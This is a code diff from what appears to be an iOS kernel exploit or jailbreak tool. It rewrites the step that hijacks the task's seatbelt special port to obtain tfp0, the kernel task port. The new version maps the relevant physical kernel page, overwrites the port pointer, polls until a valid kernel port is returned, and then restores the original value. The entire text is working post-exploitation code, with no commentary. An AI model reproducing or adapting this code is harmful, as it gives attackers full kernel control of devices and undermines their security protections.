@@ -231,15 +231,28 @@ int run_oob_entry(bool enable_tfp0) {
             if (remap_kernel_task(kinfo->mapping_base + 0x40000) != 0) goto done;
         }
 
-        uint32_t seatbelt_addr = kread32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt));
-        while (1) {
-            kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), kinfo->kern_port_addr);
-            usleep(1000);
+        uint32_t seatbelt_page = kvtophys((kinfo->self_task_addr + koffsetof(task, itk_seatbelt)) & ~0xfff);
+        uint32_t seatbelt_offset = (kinfo->self_task_addr + koffsetof(task, itk_seatbelt)) & 0xfff;
+        uint8_t *mapped_page = map_data(seatbelt_page, 0x1000, VM_PROT_READ|VM_PROT_WRITE);
 
-            task_get_special_port(mach_task_self(), TASK_SEATBELT_PORT, &kinfo->tfp0);
+        volatile uint32_t *seatbelt_ptr = (volatile uint32_t *)(mapped_page + seatbelt_offset);
+        uint32_t seatbelt_addr = *seatbelt_ptr;
+        mach_port_t task = mach_task_self();
+
+        *seatbelt_ptr = kinfo->kern_port_addr;
+        usleep(250000);
+        sync();
+
+        while (1) {
+            task_get_special_port(task, TASK_SEATBELT_PORT, &kinfo->tfp0);
             if (MACH_PORT_VALID(kinfo->tfp0)) break;
+
+            *seatbelt_ptr = kinfo->kern_port_addr;
+            usleep(50000);
+            sync();
         }
 
+        unmap_data(mapped_page, 0x1000);
         kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), seatbelt_addr);
         print_log("[*] tfp0: 0x%x\n", kinfo->tfp0);
 
